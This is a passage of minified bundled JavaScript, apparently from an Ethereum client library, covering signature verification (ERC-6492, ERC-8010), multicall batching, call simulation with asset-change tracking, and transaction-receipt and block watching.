        super(`Value \`${t}\` is an invalid y-parity value. Y-parity must be 0 or 1.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.InvalidYParityError"
        })
    }
}
class yS extends ce {
    constructor({
        value: t
    }) {
        super(`Value \`${t}\` is an invalid v value. v must be 27, 28 or >=35.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.InvalidVError"
        })
    }
}

function wS(e, t = {}) {
    return typeof e.chainId == "string" ? _S(e) : {
        ...e,
        ...t.signature
    }
}

function _S(e) {
    const {
        address: t,
        chainId: n,
        nonce: r
    } = e, s = dS(e);
    return {
        address: t,
        chainId: Number(n),
        nonce: BigInt(r),
        ...s
    }
}
const ES = "0x8010801080108010801080108010801080108010801080108010801080108010",
    vS = fx("(uint256 chainId, address delegation, uint256 nonce, uint8 yParity, uint256 r, uint256 s), address to, bytes data");

function Ox(e) {
    if (typeof e == "string") {
        if (hn(e, -32) !== ES) throw new CS(e)
    } else Nx(e.authorization)
}

function TS(e) {
    Ox(e);
    const t = Ig(hn(e, -64, -32)),
        n = hn(e, -t - 64, -64),
        r = hn(e, 0, -t - 64),
        [s, i, o] = LT(vS, n);
    return {
        authorization: wS({
            address: s.delegation,
            chainId: Number(s.chainId),
            nonce: s.nonce,
            yParity: s.yParity,
            r: s.r,
            s: s.s
        }),
        signature: r,
        ...o && o !== "0x" ? {
            data: o,
            to: i
        } : {}
    }
}

function SS(e) {
    try {
        return Ox(e), !0
    } catch {
        return !1
    }
}
let CS = class extends ce {
    constructor(t) {
        super(`Value \`${t}\` is an invalid ERC-8010 wrapped signature.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "SignatureErc8010.InvalidWrappedSignatureError"
        })
    }
};
class IS extends F {
    constructor({
        value: t
    }) {
        super(`Number \`${t}\` is not a valid decimal number.`, {
            name: "InvalidDecimalNumberError"
        })
    }
}

function AS(e, t) {
    if (!/^(-?)([0-9]*)\.?([0-9]*)$/.test(e)) throw new IS({
        value: e
    });
    let [n, r = "0"] = e.split(".");
    const s = n.startsWith("-");
    if (s && (n = n.slice(1)), r = r.replace(/(0+)$/, ""), t === 0) Math.round(+`.${r}`) === 1 && (n = `${BigInt(n)+1n}`), r = "";
    else if (r.length > t) {
        const [i, o, a] = [r.slice(0, t - 1), r.slice(t - 1, t), r.slice(t)], c = Math.round(+`${o}.${a}`);
        c > 9 ? r = `${BigInt(i)+BigInt(1)}0`.padStart(i.length + 1, "0") : r = `${i}${c}`, r.length > t && (r = r.slice(1), n = `${BigInt(n)+1n}`), r = r.slice(0, t)
    } else r = r.padEnd(t, "0");
    return BigInt(`${s?"-":""}${n}${r}`)
}

function Rx(e, t = "wei") {
    return AS(e, Gb[t])
}

function NS(e) {
    return e.map(t => ({
        ...t,
        value: BigInt(t.value)
    }))
}

function PS(e) {
    return {
        ...e,
        balance: e.balance ? BigInt(e.balance) : void 0,
        nonce: e.nonce ? Qt(e.nonce) : void 0,
        storageProof: e.storageProof ? NS(e.storageProof) : void 0
    }
}
async function OS(e, {
    address: t,
    blockNumber: n,
    blockTag: r,
    storageKeys: s
}) {
    const i = r ?? "latest",
        o = n !== void 0 ? J(n) : void 0,
        a = await e.request({
            method: "eth_getProof",
            params: [t, s, o || i]
        });
    return PS(a)
}
async function RS(e, {
    address: t,
    blockNumber: n,
    blockTag: r = "latest",
    slot: s
}) {
    const i = n !== void 0 ? J(n) : void 0;
    return await e.request({
        method: "eth_getStorageAt",
        params: [t, s, i || r]
    })
}
async function _d(e, {
    blockHash: t,
    blockNumber: n,
    blockTag: r,
    hash: s,
    index: i,
    sender: o,
    nonce: a
}) {
    const c = r || "latest",
        u = n !== void 0 ? J(n) : void 0;
    let l = null;
    if (s ? l = await e.request({
            method: "eth_getTransactionByHash",
            params: [s]
        }, {
            dedupe: !0
        }) : t ? l = await e.request({
            method: "eth_getTransactionByBlockHashAndIndex",
            params: [t, J(i)]
        }, {
            dedupe: !0
        }) : typeof i == "number" ? l = await e.request({
            method: "eth_getTransactionByBlockNumberAndIndex",
            params: [u || c, J(i)]
        }, {
            dedupe: !!u
        }) : o && typeof a == "number" && (l = await e.request({
            method: "eth_getTransactionBySenderAndNonce",
            params: [o, J(a)]
        }, {
            dedupe: !0
        })), !l) throw new Xb({
        blockHash: t,
        blockNumber: n,
        blockTag: c,
        hash: s,
        index: i
    });
    return (e.chain?.formatters?.transaction?.format || qf)(l, "getTransaction")
}
async function MS(e, {
    hash: t,
    transactionReceipt: n
}) {
    const [r, s] = await Promise.all([Y(e, oa, "getBlockNumber")({}), t ? Y(e, _d, "getTransaction")({
        hash: t
    }) : void 0]), i = n?.blockNumber || s?.blockNumber;
    return i ? r - i + 1n : 0n
}
async function Fa(e, {
    hash: t
}) {
    const n = await e.request({
        method: "eth_getTransactionReceipt",
        params: [t]
    }, {
        dedupe: !0
    });
    if (!n) throw new Kb({
        hash: t
    });
    return (e.chain?.formatters?.transactionReceipt?.format || Ug)(n, "getTransactionReceipt")
}
async function kS(e, t) {
    const {
        account: n,
        authorizationList: r,
        allowFailure: s = !0,
        blockNumber: i,
        blockOverrides: o,
        blockTag: a,
        stateOverride: c
    } = t, u = t.contracts, {
        batchSize: l = t.batchSize ?? 1024,
        deployless: f = t.deployless ?? !1
    } = typeof e.batch?.multicall == "object" ? e.batch.multicall : {}, d = (() => {
        if (t.multicallAddress) return t.multicallAddress;
        if (f) return null;
        if (e.chain) return mi({
            blockNumber: i,
            chain: e.chain,
            contract: "multicall3"
        });
        throw new Error("client chain not configured. multicallAddress is required.")
    })(), h = [
        []
    ];
    let b = 0,
        m = 0;
    for (let S = 0; S < u.length; S++) {
        const {
            abi: g,
            address: p,
            args: w,
            functionName: A
        } = u[S];
        try {
            const N = Bt({
                abi: g,
                args: w,
                functionName: A
            });
            m += (N.length - 2) / 2, l > 0 && m > l && h[b].length > 0 && (b++, m = (N.length - 2) / 2, h[b] = []), h[b] = [...h[b], {
                allowFailure: !0,
                callData: N,
                target: p
            }]
        } catch (N) {
            const v = os(N, {
                abi: g,
                address: p,
                args: w,
                docsPath: "/docs/contract/multicall",
                functionName: A,
                sender: n
            });
            if (!s) throw v;
            h[b] = [...h[b], {
                allowFailure: !0,
                callData: "0x",
                target: p
            }]
        }
    }
    const _ = await Promise.allSettled(h.map(S => Y(e, nn, "readContract")({
            ...d === null ? {
                code: id
            } : {
                address: d
            },
            abi: pc,
            account: n,
            args: [S],
            authorizationList: r,
            blockNumber: i,
            blockOverrides: o,
            blockTag: a,
            functionName: "aggregate3",
            stateOverride: c
        }))),
        E = [];
    for (let S = 0; S < _.length; S++) {
        const g = _[S];
        if (g.status === "rejected") {
            if (!s) throw g.reason;
            for (let w = 0; w < h[S].length; w++) E.push({
                status: "failure",
                error: g.reason,
                result: void 0
            });
            continue
        }
        const p = g.value;
        for (let w = 0; w < p.length; w++) {
            const {
                returnData: A,
                success: N
            } = p[w], {
                callData: v
            } = h[S][w], {
                abi: y,
                address: x,
                functionName: I,
                args: T
            } = u[E.length];
            try {
                if (v === "0x") throw new Xo;
                if (!N) throw new hl({
                    data: A
                });
                const O = ms({
                    abi: y,
                    args: T,
                    data: A,
                    functionName: I
                });
                E.push(s ? {
                    result: O,
                    status: "success"
                } : O)
            } catch (O) {
                const L = os(O, {
                    abi: y,
                    address: x,
                    args: T,
                    docsPath: "/docs/contract/multicall",
                    functionName: I
                });
                if (!s) throw L;
                E.push({
                    error: L,
                    result: void 0,
                    status: "failure"
                })
            }
        }
    }
    if (E.length !== u.length) throw new F("multicall results mismatch");
    return E
}
async function b0(e, t) {
    const {
        blockNumber: n,
        blockTag: r = e.experimental_blockTag ?? "latest",
        blocks: s,
        returnFullTransactions: i,
        traceTransfers: o,
        validation: a
    } = t;
    try {
        const c = [];
        for (const d of s) {
            const h = d.blockOverrides ? Pg(d.blockOverrides) : void 0,
                b = d.calls.map(_ => {
                    const E = _,
                        S = E.account ? Se(E.account) : void 0,
                        g = E.abi ? Bt(E) : E.data,
                        p = {
                            ...E,
                            account: S,
                            data: E.dataSuffix ? qt([g || "0x", E.dataSuffix]) : g,
                            from: E.from ?? S?.address
                        };
                    return nr(p), Cr(p)
                }),
                m = d.stateOverrides ? jf(d.stateOverrides) : void 0;
            c.push({
                blockOverrides: h,
                calls: b,
                stateOverrides: m
            })
        }
        const l = (typeof n == "bigint" ? J(n) : void 0) || r;
        return (await e.request({
            method: "eth_simulateV1",
            params: [{
                blockStateCalls: c,
                returnFullTransactions: i,
                traceTransfers: o,
                validation: a
            }, l]
        })).map((d, h) => ({
            ...ag(d),
            calls: d.calls.map((b, m) => {
                const {
                    abi: _,
                    args: E,
                    functionName: S,
                    to: g
                } = s[h].calls[m], p = b.error?.data ?? b.returnData, w = BigInt(b.gasUsed), A = b.logs?.map(x => Zn(x)), N = b.status === "0x1" ? "success" : "failure", v = _ && N === "success" && p !== "0x" ? ms({
                    abi: _,
                    data: p,
                    functionName: S
                }) : null, y = (() => {
                    if (N === "success") return;
                    let x;
                    if (b.error?.data === "0x" ? x = new Xo : b.error && (x = new hl(b.error)), !!x) return os(x, {
                        abi: _ ?? [],
                        address: g ?? "0x",
                        args: E,
                        functionName: S ?? "<unknown>"
                    })
                })();
                return {
                    data: p,
                    gasUsed: w,
                    logs: A,
                    status: N,
                    ...N === "success" ? {
                        result: v
                    } : {
                        error: y
                    }
                }
            })
        }))
    } catch (c) {
        const u = c,
            l = ml(u, {});
        throw l instanceof ea ? u : l
    }
}

function g0(e) {
    let t = !0,
        n = "",
        r = 0,
        s = "",
        i = !1;
    for (let o = 0; o < e.length; o++) {
        const a = e[o];
        if (["(", ")", ","].includes(a) && (t = !0), a === "(" && r++, a === ")" && r--, !!t) {
            if (r === 0) {
                if (a === " " && ["event", "function", "error", ""].includes(s)) s = "";
                else if (s += a, a === ")") {
                    i = !0;
                    break
                }
                continue
            }
            if (a === " ") {
                e[o - 1] !== "," && n !== "," && n !== ",(" && (n = "", t = !1);
                continue
            }
            s += a, n += a
        }
    }
    if (!i) throw new ce("Unable to normalize signature.");
    return s
}

function x0(e, t) {
    const n = typeof e,
        r = t.type;
    switch (r) {
        case "address":
            return l0(e, {
                strict: !1
            });
        case "bool":
            return n === "boolean";
        case "function":
            return n === "string";
        case "string":
            return n === "string";
        default:
            return r === "tuple" && "components" in t ? Object.values(t.components).every((s, i) => x0(Object.values(e)[i], s)) : /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(r) ? n === "number" || n === "bigint" : /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(r) ? n === "string" || e instanceof Uint8Array : /[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(r) ? Array.isArray(e) && e.every(s => x0(s, {
                ...t,
                type: r.replace(/(\[[0-9]{0,}\])$/, "")
            })) : !1
    }
}

function Mx(e, t, n) {
    for (const r in e) {
        const s = e[r],
            i = t[r];
        if (s.type === "tuple" && i.type === "tuple" && "components" in s && "components" in i) return Mx(s.components, i.components, n[r]);
        const o = [s.type, i.type];
        if (o.includes("address") && o.includes("bytes20") ? !0 : o.includes("address") && o.includes("string") ? l0(n[r], {
                strict: !1
            }) : o.includes("address") && o.includes("bytes") ? l0(n[r], {
                strict: !1
            }) : !1) return o
    }
}

function kx(e, t = {}) {
    const {
        prepare: n = !0
    } = t, r = Array.isArray(e) || typeof e == "string" ? Uh(e) : e;
    return {
        ...r,
        ...n ? {
            hash: As(r)
        } : {}
    }
}

function Il(e, t, n) {
    const {
        args: r = [],
        prepare: s = !0
    } = n ?? {}, i = jv(t, {
        strict: !1
    }), o = e.filter(u => i ? u.type === "function" || u.type === "error" ? Bx(u) === hn(t, 0, 4) : u.type === "event" ? As(u) === t : !1 : "name" in u && u.name === t);
    if (o.length === 0) throw new bc({
        name: t
    });
    if (o.length === 1) return {
        ...o[0],
        ...s ? {
            hash: As(o[0])
        } : {}
    };
    let a;
    for (const u of o) {
        if (!("inputs" in u)) continue;
        if (!r || r.length === 0) {
            if (!u.inputs || u.inputs.length === 0) return {
                ...u,
                ...s ? {
                    hash: As(u)
                } : {}
            };
            continue
        }
        if (!u.inputs || u.inputs.length === 0 || u.inputs.length !== r.length) continue;
        if (r.every((f, d) => {
                const h = "inputs" in u && u.inputs[d];
                return h ? x0(f, h) : !1
            })) {
            if (a && "inputs" in a && a.inputs) {
                const f = Mx(u.inputs, a.inputs, r);
                if (f) throw new LS({
                    abiItem: u,
                    type: f[0]
                }, {
                    abiItem: a,
                    type: f[1]
                })
            }
            a = u
        }
    }
    const c = (() => {
        if (a) return a;
        const [u, ...l] = o;
        return {
            ...u,
            overloads: l
        }
    })();
    if (!c) throw new bc({
        name: t
    });
    return {
        ...c,
        ...s ? {
            hash: As(c)
        } : {}
    }
}

function Bx(...e) {
    const t = (() => {
        if (Array.isArray(e[0])) {
            const [n, r] = e;
            return Il(n, r)
        }
        return e[0]
    })();
    return hn(As(t), 0, 4)
}

function BS(...e) {
    const t = (() => {
            if (Array.isArray(e[0])) {
                const [r, s] = e;
                return Il(r, s)
            }
            return e[0]
        })(),
        n = typeof t == "string" ? t : lc(t);
    return g0(n)
}

function As(...e) {
    const t = (() => {
        if (Array.isArray(e[0])) {
            const [n, r] = e;
            return Il(n, r)
        }
        return e[0]
    })();
    return typeof t != "string" && "hash" in t && t.hash ? t.hash : cx(sd(BS(t)))
}
class LS extends ce {
    constructor(t, n) {
        super("Found ambiguous types in overloaded ABI Items.", {
            metaMessages: [`\`${t.type}\` in \`${g0(lc(t.abiItem))}\`, and`, `\`${n.type}\` in \`${g0(lc(n.abiItem))}\``, "", "These types encode differently and cannot be distinguished at runtime.", "Remove one of the ambiguous items in the ABI."]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiItem.AmbiguityError"
        })
    }
}
class bc extends ce {
    constructor({
        name: t,
        data: n,
        type: r = "item"
    }) {
        const s = t ? ` with name "${t}"` : n ? ` with data "${n}"` : "";
        super(`ABI ${r}${s} not found.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiItem.NotFoundError"
        })
    }
}

function $S(...e) {
    const [t, n] = (() => {
        if (Array.isArray(e[0])) {
            const [i, o] = e;
            return [FS(i), o]
        }
        return e
    })(), {
        bytecode: r,
        args: s
    } = n;
    return en(r, t.inputs?.length && s?.length ? bd(t.inputs, s) : "0x")
}

function DS(e) {
    return kx(e)
}

function FS(e) {
    const t = e.find(n => n.type === "constructor");
    if (!t) throw new bc({
        name: "constructor"
    });
    return t
}

function US(...e) {
    const [t, n = []] = (() => {
        if (Array.isArray(e[0])) {
            const [u, l, f] = e;
            return [kp(u, l, {
                args: f
            }), f]
        }
        const [a, c] = e;
        return [a, c]
    })(), {
        overloads: r
    } = t, s = r ? kp([t, ...r], t.name, {
        args: n
    }) : t, i = VS(s), o = n.length > 0 ? bd(s.inputs, n) : void 0;
    return o ? en(i, o) : i
}

function _s(e, t = {}) {
    return kx(e, t)
}

function kp(e, t, n) {
    const r = Il(e, t, n);
    if (r.type !== "function") throw new bc({
        name: t,
        type: "function"
    });
    return r
}

function VS(e) {
    return Bx(e)
}
const HS = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
    cn = "0x0000000000000000000000000000000000000000",
    jS = "0x6080604052348015600e575f80fd5b5061016d8061001c5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063f8b2cb4f1461002d575b5f80fd5b610047600480360381019061004291906100db565b61005d565b604051610054919061011e565b60405180910390f35b5f8173ffffffffffffffffffffffffffffffffffffffff16319050919050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100aa82610081565b9050919050565b6100ba816100a0565b81146100c4575f80fd5b50565b5f813590506100d5816100b1565b92915050565b5f602082840312156100f0576100ef61007d565b5b5f6100fd848285016100c7565b91505092915050565b5f819050919050565b61011881610106565b82525050565b5f6020820190506101315f83018461010f565b9291505056fea26469706673582212203b9fe929fe995c7cf9887f0bdba8a36dd78e8b73f149b17d2d9ad7cd09d2dc6264736f6c634300081a0033";
async function zS(e, t) {
    const {
        blockNumber: n,
        blockTag: r,
        calls: s,
        stateOverrides: i,
        traceAssetChanges: o,
        traceTransfers: a,
        validation: c
    } = t, u = t.account ? Se(t.account) : void 0;
    if (o && !u) throw new F("`account` is required when `traceAssetChanges` is true");
    const l = u ? $S(DS("constructor(bytes, bytes)"), {
            bytecode: kg,
            args: [jS, US(_s("function getBalance(address)"), [u.address])]
        }) : void 0,
        f = o ? await Promise.all(t.calls.map(async B => {
            if (!B.data && !B.abi) return;
            const {
                accessList: q
            } = await Jg(e, {
                account: u.address,
                ...B,
                data: B.abi ? Bt(B) : B.data
            });
            return q.map(({
                address: Q,
                storageKeys: se
            }) => se.length > 0 ? Q : null)
        })).then(B => B.flat().filter(Boolean)) : [],
        d = await b0(e, {
            blockNumber: n,
            blockTag: r,
            blocks: [...o ? [{
                calls: [{
                    data: l
                }],
                stateOverrides: i
            }, {
                calls: f.map((B, q) => ({
                    abi: [_s("function balanceOf(address) returns (uint256)")],
                    functionName: "balanceOf",
                    args: [u.address],
                    to: B,
                    from: cn,
                    nonce: q
                })),
                stateOverrides: [{
                    address: cn,
                    nonce: 0
                }]
            }] : [], {
                calls: [...s, {}].map(B => ({
                    ...B,
                    from: u?.address
                })),
                stateOverrides: i
            }, ...o ? [{
                calls: [{
                    data: l
                }]
            }, {
                calls: f.map((B, q) => ({
                    abi: [_s("function balanceOf(address) returns (uint256)")],
                    functionName: "balanceOf",
                    args: [u.address],
                    to: B,
                    from: cn,
                    nonce: q
                })),
                stateOverrides: [{
                    address: cn,
                    nonce: 0
                }]
            }, {
                calls: f.map((B, q) => ({
                    to: B,
                    abi: [_s("function decimals() returns (uint256)")],
                    functionName: "decimals",
                    from: cn,
                    nonce: q
                })),
                stateOverrides: [{
                    address: cn,
                    nonce: 0
                }]
            }, {
                calls: f.map((B, q) => ({
                    to: B,
                    abi: [_s("function tokenURI(uint256) returns (string)")],
                    functionName: "tokenURI",
                    args: [0n],
                    from: cn,
                    nonce: q
                })),
                stateOverrides: [{
                    address: cn,
                    nonce: 0
                }]
            }, {
                calls: f.map((B, q) => ({
                    to: B,
                    abi: [_s("function symbol() returns (string)")],
                    functionName: "symbol",
                    from: cn,
                    nonce: q
                })),
                stateOverrides: [{
                    address: cn,
                    nonce: 0
                }]
            }] : []],
            traceTransfers: a,
            validation: c
        }),
        h = o ? d[2] : d[0],
        [b, m, , _, E, S, g, p] = o ? d : [],
        {
            calls: w,
            ...A
        } = h,
        N = w.slice(0, -1) ?? [],
        v = b?.calls ?? [],
        y = m?.calls ?? [],
        x = [...v, ...y].map(B => B.status === "success" ? Mt(B.data) : null),
        I = _?.calls ?? [],
        T = E?.calls ?? [],
        O = [...I, ...T].map(B => B.status === "success" ? Mt(B.data) : null),
        L = (S?.calls ?? []).map(B => B.status === "success" ? B.result : null),
        k = (p?.calls ?? []).map(B => B.status === "success" ? B.result : null),
        R = (g?.calls ?? []).map(B => B.status === "success" ? B.result : null),
        D = [];
    for (const [B, q] of O.entries()) {
        const Q = x[B];
        if (typeof q != "bigint" || typeof Q != "bigint") continue;
        const se = L[B - 1],
            le = k[B - 1],
            dt = R[B - 1],
            Ke = B === 0 ? {
                address: HS,
                decimals: 18,
                symbol: "ETH"
            } : {
                address: f[B - 1],
                decimals: dt || se ? Number(se ?? 1) : void 0,
                symbol: le ?? void 0
            };
        D.some(De => De.token.address === Ke.address) || D.push({
            token: Ke,
            value: {
                pre: Q,
                post: q,
                diff: q - Q
            }
        })
    }
    return {
        assetChanges: D,
        block: A,
        results: N
    }
}
const Lx = "0x6492649264926492649264926492649264926492649264926492649264926492";

function qS(e) {
    if (hn(e, -32) !== Lx) throw new XS(e)
}

function GS(e) {
    const {
        data: t,
        signature: n,
        to: r
    } = e;
    return en(bd(fx("address, bytes, bytes"), [r, t, n]), Lx)
}

function WS(e) {
    try {
        return qS(e), !0
    } catch {
        return !1
    }
}
class XS extends ce {
    constructor(t) {
        super(`Value \`${t}\` is an invalid ERC-6492 wrapped signature.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "SignatureErc6492.InvalidWrappedSignatureError"
        })
    }
}

function KS({
    r: e,
    s: t,
    to: n = "hex",
    v: r,
    yParity: s
}) {
    const i = (() => {
            if (s === 0 || s === 1) return s;
            if (r && (r === 27n || r === 28n || r >= 35n)) return r % 2n === 0n ? 1 : 0;
            throw new Error("Invalid `v` or `yParity` value")
        })(),
        o = `0x${new Ax.Signature(Mt(e),Mt(t)).toCompactHex()}${i===0?"1b":"1c"}`;
    return n === "hex" ? o : gn(o)
}
async function Al(e, t) {
    const {
        address: n,
        hash: r,
        erc6492VerifierAddress: s = t.universalSignatureVerifierAddress ?? e.chain?.contracts?.erc6492Verifier?.address,
        multicallAddress: i = t.multicallAddress ?? e.chain?.contracts?.multicall3?.address
    } = t, o = (() => {
        const a = t.signature;
        return bn(a) ? a : typeof a == "object" && "r" in a && "s" in a ? KS(a) : Le(a)
    })();
    try {
        return SS(o) ? await ZS(e, {
            ...t,
            multicallAddress: i,
            signature: o
        }) : await YS(e, {
            ...t,
            verifierAddress: s,
            signature: o
        })
    } catch (a) {
        try {
            if (na(Lf(n), await eg({
                    hash: r,
                    signature: o
                }))) return !0
        } catch {}
        if (a instanceof ls) return !1;
        throw a
    }
}
async function ZS(e, t) {
    const {
        address: n,
        blockNumber: r,
        blockTag: s,
        hash: i,
        multicallAddress: o
    } = t, {
        authorization: a,
        data: c,
        signature: u,
        to: l
    } = TS(t.signature);
    if (await c0(e, {
            address: n,
            blockNumber: r,
            blockTag: s
        }) === hi(["0xef0100", a.address])) return await JS(e, {
        address: n,
        blockNumber: r,
        blockTag: s,
        hash: i,
        signature: u
    });
    const d = {
        address: a.address,
        chainId: Number(a.chainId),
        nonce: Number(a.nonce),
        r: J(a.r, {
            size: 32
        }),
        s: J(a.s, {
            size: 32
        }),
        yParity: a.yParity
    };
    if (!await q9({
            address: n,
            authorization: d
        })) throw new ls;
    const b = await Y(e, nn, "readContract")({
        ...o ? {
            address: o
        } : {
            code: id
        },
        authorizationList: [d],
        abi: pc,
        blockNumber: r,
        blockTag: "pending",
        functionName: "aggregate3",
        args: [
            [...c ? [{
                allowFailure: !0,
                target: l ?? n,
                callData: c
            }] : [], {
                allowFailure: !0,
                target: n,
                callData: Bt({
                    abi: Mg,
                    functionName: "isValidSignature",
                    args: [i, u]
                })
            }]
        ]
    });
    if (b[b.length - 1]?.returnData?.startsWith("0x1626ba7e")) return !0;
    throw new ls
}
async function YS(e, t) {
    const {
        address: n,
        factory: r,
        factoryData: s,
        hash: i,
        signature: o,
        verifierAddress: a,
        ...c
    } = t, u = await (async () => !r && !s || WS(o) ? o : GS({
        data: s,
        signature: o,
        to: r
    }))(), l = a ? {
        to: a,
        data: Bt({
            abi: yp,
            functionName: "isValidSig",
            args: [n, i, u]
        }),
        ...c
    } : {
        data: wl({
            abi: yp,
            args: [n, i, u],
            bytecode: Zv
        }),
        ...c
    }, {
        data: f
    } = await Y(e, _l, "call")(l).catch(d => {
        throw d instanceof Yb ? new ls : d
    });
    if (pE(f ?? "0x0")) return !0;
    throw new ls
}
async function JS(e, t) {
    const {
        address: n,
        blockNumber: r,
        blockTag: s,
        hash: i,
        signature: o
    } = t;
    if ((await Y(e, nn, "readContract")({
            address: n,
            abi: Mg,
            args: [i, o],
            blockNumber: r,
            blockTag: s,
            functionName: "isValidSignature"
        }).catch(c => {
            throw c instanceof Jb ? new ls : c
        })).startsWith("0x1626ba7e")) return !0;
    throw new ls
}
class ls extends Error {}
async function QS(e, {
    address: t,
    message: n,
    factory: r,
    factoryData: s,
    signature: i,
    ...o
}) {
    const a = tx(n);
    return Y(e, Al, "verifyHash")({
        address: t,
        factory: r,
        factoryData: s,
        hash: a,
        signature: i,
        ...o
    })
}
async function e7(e, t) {
    const {
        address: n,
        factory: r,
        factoryData: s,
        signature: i,
        message: o,
        primaryType: a,
        types: c,
        domain: u,
        ...l
    } = t, f = oT({
        message: o,
        primaryType: a,
        types: c,
        domain: u
    });
    return Y(e, Al, "verifyHash")({
        address: n,
        factory: r,
        factoryData: s,
        hash: f,
        signature: i,
        ...l
    })
}

function $x(e, {
    emitOnBegin: t = !1,
    emitMissed: n = !1,
    onBlockNumber: r,
    onError: s,
    poll: i,
    pollingInterval: o = e.pollingInterval
}) {
    const a = typeof i < "u" ? i : !(e.transport.type === "webSocket" || e.transport.type === "ipc" || e.transport.type === "fallback" && (e.transport.transports[0].config.type === "webSocket" || e.transport.transports[0].config.type === "ipc"));
    let c;
    return a ? (() => {
        const f = Be(["watchBlockNumber", e.uid, t, n, o]);
        return Yn(f, {
            onBlockNumber: r,
            onError: s
        }, d => bi(async () => {
            try {
                const h = await Y(e, oa, "getBlockNumber")({
                    cacheTime: 0
                });
                if (c !== void 0) {
                    if (h === c) return;
                    if (h - c > 1 && n)
                        for (let b = c + 1n; b < h; b++) d.onBlockNumber(b, c), c = b
                }(c === void 0 || h > c) && (d.onBlockNumber(h, c), c = h)
            } catch (h) {
                d.onError?.(h)
            }
        }, {
            emitOnBegin: t,
            interval: o
        }))
    })() : (() => {
        const f = Be(["watchBlockNumber", e.uid, t, n]);
        return Yn(f, {
            onBlockNumber: r,
            onError: s
        }, d => {
            let h = !0,
                b = () => h = !1;
            return (async () => {
                try {
                    const m = (() => {
                            if (e.transport.type === "fallback") {
                                const E = e.transport.transports.find(S => S.config.type === "webSocket" || S.config.type === "ipc");
                                return E ? E.value : e.transport
                            }
                            return e.transport
                        })(),
                        {
                            unsubscribe: _
                        } = await m.subscribe({
                            params: ["newHeads"],
                            onData(E) {
                                if (!h) return;
                                const S = Mt(E.result?.number);
                                d.onBlockNumber(S, c), c = S
                            },
                            onError(E) {
                                d.onError?.(E)
                            }
                        });
                    b = _, h || b()
                } catch (m) {
                    s?.(m)
                }
            })(), () => b()
        })
    })()
}
async function Dx(e, t) {
    const {
        checkReplacement: n = !0,
        confirmations: r = 1,
        hash: s,
        onReplaced: i,
        retryCount: o = 6,
        retryDelay: a = ({
            count: w
        }) => ~~(1 << w) * 200,
        timeout: c = 18e4
    } = t, u = Be(["waitForTransactionReceipt", e.uid, s]), l = t.pollingInterval ? t.pollingInterval : e.chain?.experimental_preconfirmationTime ? e.chain.experimental_preconfirmationTime : e.pollingInterval;
    let f, d, h, b = !1,
        m, _;
    const {
        promise: E,
        resolve: S,
        reject: g
    } = od(), p = c ? setTimeout(() => {
        _?.(), m?.(), g(new I4({
            hash: s
        }))
    }, c) : void 0;
    return m = Yn(u, {
        onReplaced: i,
        resolve: S,
        reject: g
    }, async w => {
        if (h = await Y(e, Fa, "getTransactionReceipt")({
                hash: s
            }).catch(() => {}), h && r <= 1) {
            clearTimeout(p), w.resolve(h), m?.();
            return
        }
        _ = Y(e, $x, "watchBlockNumber")({
            emitMissed: !0,
            emitOnBegin: !0,
            poll: !0,
            pollingInterval: l,
            async onBlockNumber(A) {
                const N = y => {
                    clearTimeout(p), _?.(), y(), m?.()
                };
                let v = A;
                if (!b) try {
                    if (h) {
                        if (r > 1 && (!h.blockNumber || v - h.blockNumber + 1n < r)) return;
                        N(() => w.resolve(h));
                        return
                    }
                    if (n && !f && (b = !0, await mc(async () => {
                            f = await Y(e, _d, "getTransaction")({
                                hash: s
                            }), f.blockNumber && (v = f.blockNumber)
                        }, {
                            delay: a,
                            retryCount: o
                        }), b = !1), h = await Y(e, Fa, "getTransactionReceipt")({
                            hash: s
                        }), r > 1 && (!h.blockNumber || v - h.blockNumber + 1n < r)) return;
                    N(() => w.resolve(h))
                } catch (y) {
                    if (y instanceof Xb || y instanceof Kb) {
                        if (!f) {
                            b = !1;
                            return
                        }
                        try {
                            d = f, b = !0;
                            const x = await mc(() => Y(e, Kt, "getBlock")({
                                blockNumber: v,
                                includeTransactions: !0
                            }), {
                                delay: a,
                                retryCount: o,
                                shouldRetry: ({
                                    error: O
                                }) => O instanceof ig
                            });
                            b = !1;
                            const I = x.transactions.find(({
                                from: O,
                                nonce: L
                            }) => O === d.from && L === d.nonce);
                            if (!I || (h = await Y(e, Fa, "getTransactionReceipt")({
                                    hash: I.hash
                                }), r > 1 && (!h.blockNumber || v - h.blockNumber + 1n < r))) return;
                            let T = "replaced";
                            I.to === d.to && I.value === d.value && I.input === d.input ? T = "repriced" : I.from === I.to && I.value === 0n && (T = "cancelled"), N(() => {
                                w.onReplaced?.({
                                    reason: T,
                                    replacedTransaction: d,
                                    transaction: I,
                                    transactionReceipt: h
                                }), w.resolve(h)
                            })
                        } catch (x) {
                            N(() => w.reject(x))
                        }
                    } else N(() => w.reject(y))
                }
            }
        })
    }), E
}

function t7(e, {
    blockTag: t = e.experimental_blockTag ?? "latest",
    emitMissed: n = !1,
    emitOnBegin: r = !1,
    onBlock: s,
    onError: i,
    includeTransactions: o,
    poll: a,
    pollingInterval: c = e.pollingInterval
}) {
    const u = typeof a < "u" ? a : !(e.transport.type === "webSocket" || e.transport.type === "ipc" || e.transport.type === "fallback" && (e.transport.transports[0].config.type === "webSocket" || e.transport.transports[0].config.type === "ipc")),
        l = o ?? !1;
    let f;
    return u ? (() => {
        const b = Be(["watchBlocks", e.uid, t, n, r, l, c]);
        return Yn(b, {
            onBlock: s,
            onError: i
        }, m => bi(async () => {
            try {
                const _ = await Y(e, Kt, "getBlock")({
                    blockTag: t,
                    includeTransactions: l
                });
